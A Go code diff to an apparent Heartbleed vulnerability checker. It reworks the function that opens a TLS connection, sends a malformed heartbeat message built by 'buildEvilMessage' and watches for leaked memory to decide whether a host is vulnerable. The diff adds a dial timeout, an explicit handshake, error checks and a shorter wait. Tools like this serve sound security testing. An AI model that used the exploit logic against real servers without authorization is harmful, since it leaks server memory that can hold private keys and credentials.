@@ -6,6 +6,7 @@ import (
 	"errors"
 	"github.com/FiloSottile/Heartbleed/tls"
 	"github.com/davecgh/go-spew/spew"
+	"net"
 	"time"
 )
 
@@ -53,23 +54,33 @@ func heartbleedCheck(conn *tls.Conn, buf *bytes.Buffer, vuln chan bool) func([]b
 }
 
 func Heartbleed(host string, payload []byte) (out []byte, err error) {
-	conn, err := tls.Dial("tcp", host, &tls.Config{InsecureSkipVerify: true})
+	net_conn, err := net.DialTimeout("tcp", host, 3*time.Second)
+	if err != nil {
+		return
+	}
+	net_conn.SetDeadline(time.Now().Add(9 * time.Second))
+	conn := tls.Client(net_conn, &tls.Config{InsecureSkipVerify: true})
+	err = conn.Handshake()
 	if err != nil {
 		return
 	}
 
 	var vuln = make(chan bool, 1)
 	buf := new(bytes.Buffer)
-	conn.SendHeartbeat([]byte(buildEvilMessage(payload)), heartbleedCheck(conn, buf, vuln))
+	err = conn.SendHeartbeat([]byte(buildEvilMessage(payload)), heartbleedCheck(conn, buf, vuln))
+	if err != nil {
+		return
+	}
 
 	go func() {
+		// Needed to process the incoming heartbeat
 		conn.Read(nil)
 	}()
 
 	go func() {
 		time.Sleep(3 * time.Second)
 		_, err = conn.Write([]byte("quit\n"))
-		conn.Read(nil)
+		conn.Read(nil) // TODO: here we should probably chack that it succeed
 		vuln <- false
 	}()
 
@@ -85,7 +96,7 @@ func Heartbleed(host string, payload []byte) (out []byte, err error) {
 			err = Safe
 			return
 		}
-	case <-time.After(10 * time.Second):
+	case <-time.After(6 * time.Second):
 		err = Timeout
 		conn.Close()
 		return
